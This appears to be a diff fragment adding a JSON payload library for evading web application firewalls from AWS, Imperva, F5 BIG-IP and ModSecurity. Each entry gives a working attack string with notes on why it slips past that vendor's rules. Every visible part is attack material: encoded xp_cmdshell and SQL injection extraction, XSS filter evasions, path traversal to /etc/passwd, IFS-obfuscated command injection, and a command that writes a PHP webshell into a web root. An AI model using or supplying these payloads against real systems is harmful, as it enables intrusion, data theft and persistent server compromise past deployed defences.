+          "payload": "1';exec(char(0x78)+char(0x70)+char(0x5f)+char(0x63)+char(0x6d)+char(0x64)+char(0x73)+char(0x68)+char(0x65)+char(0x6c)+char(0x6c))--",
+          "description": "MSSQL xp_cmdshell via char concatenation to bypass keyword filter",
+          "technique": "char_code_encoding",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Direct xp_cmdshell is blocked; char()-encoded reconstruction bypasses string match"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<script>window['ale'+'rt'](1)</script>",
+          "description": "String concatenation to construct alert bypassing AWS WAF XSS string matching",
+          "technique": "string_concatenation",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "AWS WAF XSS match condition checks for 'alert(' as substring; splitting it evades"
+        },
+        {
+          "payload": "<iframe%09src=%22javascript:alert(1)\"%09>",
+          "description": "Tab character as attribute separator to bypass AWS WAF attribute parsing",
+          "technique": "whitespace_variation",
+          "severity": "medium",
+          "target": "query_string",
+          "notes": "AWS WAF HTML normalization may miss tab characters as attribute separators"
+        }
+      ],
+      "lfi": [
+        {
+          "payload": "....//....//....//etc/passwd",
+          "description": "Double-slash path traversal bypassing AWS WAF's ../ normalization rule",
+          "technique": "path_traversal_variation",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "AWS WAF managed rules strip ../ but may not handle ....// variants"
+        }
+      ]
+    },
+    "imperva": {
+      "sqli": [
+        {
+          "payload": "1' AND (SELECT 1)=(SELECT 1) UNION SELECT 1,user(),3--",
+          "description": "Nested SELECT comparison wrapping UNION to break Imperva's UNION detection heuristic",
+          "technique": "subquery_wrapping",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Imperva uses semantic analysis; wrapping in equality comparison confuses it"
+        },
+        {
+          "payload": "1 AND '1'='1'--+-",
+          "description": "URL suffix --+- as comment to normalize the payload away from Imperva's exact signatures",
+          "technique": "none",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "Imperva watches for --  ; the --+- variant achieves same SQL effect"
+        },
+        {
+          "payload": "1 UNION ALL SELECT NULL, @@version, NULL#",
+          "description": "MySQL hash comment at end and ALL keyword to bypass Imperva UNION SELECT rule",
+          "technique": "comment_injection",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Imperva's pattern may not cover UNION ALL SELECT with hash comment"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<object data=\"javascript:alert(1)\">",
+          "description": "Object data attribute with JavaScript protocol bypassing Imperva's tag filter",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "body",
+          "notes": "Imperva targets script/img/svg; object tag is less commonly covered"
+        },
+        {
+          "payload": "<embed src=javascript:alert(1)>",
+          "description": "Embed tag with javascript: source bypassing Imperva XSS rules",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "body",
+          "notes": "embed is an older HTML tag that may not be in Imperva's default XSS ruleset"
+        }
+      ]
+    },
+    "f5_bigip": {
+      "sqli": [
+        {
+          "payload": "1';EXEC(0x73656c6563742031)--",
+          "description": "MSSQL EXEC with hex-encoded statement to bypass F5 BIG-IP ASM SQL keyword rules",
+          "technique": "hex_encoding",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "F5 ASM inspects SQL keywords; hex encoding of the inner statement evades detection"
+        },
+        {
+          "payload": "1' AND 1=1 ORDER BY 1--",
+          "description": "Low-risk ORDER BY probe with benign-looking 1=1 to stay under F5 anomaly score",
+          "technique": "none",
+          "severity": "medium",
+          "target": "query_string",
+          "notes": "F5 ASM uses scoring; benign-looking payloads probe column count under threshold"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<<script>alert(1)//<</script>",
+          "description": "Double angle bracket confusion to bypass F5 BIG-IP HTML parser normalization",
+          "technique": "tag_switching",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "F5 may strip leading < and pass inner script tag"
+        },
+        {
+          "payload": "<script>window.onerror=alert;throw 1</script>",
+          "description": "window.onerror assignment to call alert on throw, bypassing direct alert() detection",
+          "technique": "none",
+          "severity": "high",
+          "target": "body",
+          "notes": "F5 may match alert( specifically; onerror assignment avoids that pattern"
+        }
+      ]
+    },
+    "modsecurity": {
+      "sqli": [
+        {
+          "payload": "1' /*!50000AND*/ /*!50000SLEEP*/(5)--",
+          "description": "MySQL version-specific conditional comments for SLEEP bypass of ModSecurity CRS",
+          "technique": "comment_injection",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "CRS rules detect AND SLEEP as a phrase; conditional comments fragment detection"
+        },
+        {
+          "payload": "1' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+          "description": "Error-based extraction via FLOOR(RAND()) group by error to bypass ModSecurity CRS UNION rules",
+          "technique": "error_based",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Does not use UNION; error-based extraction through aggregation error"
+        },
+        {
+          "payload": "1 AND EXTRACTVALUE(rand(),concat(0x3a,version()))--",
+          "description": "EXTRACTVALUE error-based extraction with rand() to bypass static signature checks",
+          "technique": "error_based",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "rand() as first arg varies the call signature to avoid exact-match rules"
+        },
+        {
+          "payload": "1' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--",
+          "description": "CASE-WHEN division by zero for boolean blind, avoiding OR/AND=direct pattern in CRS",
+          "technique": "boolean_blind",
+          "severity": "high",
+          "target": "query_string",
+          "notes": "CRS anomaly scoring targets OR/AND patterns; CASE WHEN is less scored"
+        }
+      ],
+      "xss": [
+        {
+          "payload": "<a onmouseover=\"alert(1)\">xss</a>",
+          "description": "Anchor onmouseover to bypass ModSecurity CRS script-tag focus",
+          "technique": "tag_switching",
+          "severity": "medium",
+          "target": "body",
+          "notes": "CRS focuses on script tags and dangerous attributes; onmouseover is lower priority"
+        },
+        {
+          "payload": "<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+          "description": "HTML entity encoded alert() in onerror to bypass ModSecurity XSS string matching",
+          "technique": "html_entity",
+          "severity": "medium",
+          "target": "query_string",
+          "notes": "CRS matches on 'alert(' string; entity encoding prevents direct match"
+        }
+      ],
+      "rce": [
+        {
+          "payload": ";c${IFS}a${IFS}t${IFS}/etc/passwd",
+          "description": "IFS variable in command name with shell variable expansion to evade ModSecurity RCE rules",
+          "technique": "space_bypass",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "CRS RCE rules match 'cat /etc/passwd'; IFS substitution fragments all tokens"
+        },
+        {
+          "payload": ";echo${IFS}'<'${IFS}'?php${IFS}system($_GET[c]);?>'>/var/www/html/s.php",
+          "description": "Webshell write via echo with IFS spaces to bypass ModSecurity RCE string match",
+          "technique": "space_bypass",
+          "severity": "critical",
+          "target": "query_string",
+          "notes": "Quote wrapping and IFS prevent CRS from detecting the complete shell pattern"
+        }
+      ]
+    }
+  }
+}
